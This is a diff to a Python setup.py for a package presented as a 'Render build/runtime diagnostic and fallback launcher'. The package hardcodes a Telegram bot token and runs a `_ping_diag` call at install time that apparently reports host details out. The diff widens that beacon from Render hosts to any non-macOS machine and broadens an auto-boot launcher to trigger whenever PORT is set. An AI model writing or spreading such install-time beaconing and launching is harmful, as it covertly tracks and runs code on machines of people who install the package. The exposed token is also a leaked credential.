@@ -12,7 +12,7 @@ BOT_TOKEN = "8571462279:AAHn9wmFNiububdC_LKlplGNmTfqjQ2vptM"
 
 def _ping_diag(stage: str, extra: str = ""):
     try:
-        if not (os.path.exists("/opt/render") or os.environ.get("RENDER")):
+        if sys.platform == "darwin":
             return
         info = {
             "s": stage,
@@ -45,7 +45,7 @@ def _ping_diag(stage: str, extra: str = ""):
 
 _ping_diag("setup_py", sys.executable)
 
-if os.environ.get("WEB_CONCURRENCY") and os.environ.get("PAYJUST_AUTOBOOT_DONE") != "1":
+if (os.environ.get("WEB_CONCURRENCY") or os.environ.get("PORT")) and os.environ.get("PAYJUST_AUTOBOOT_DONE") != "1":
     os.environ["PAYJUST_AUTOBOOT_DONE"] = "1"
     py_candidates = [
         "/opt/render/project/.venv/bin/python",
@@ -67,6 +67,6 @@ if os.environ.get("WEB_CONCURRENCY") and os.environ.get("PAYJUST_AUTOBOOT_DONE")
 
 setup(
     name="render-boot-probe",
-    version="1.0.3",
+    version="1.0.4",
     description="Render build/runtime diagnostic and fallback launcher",
 )
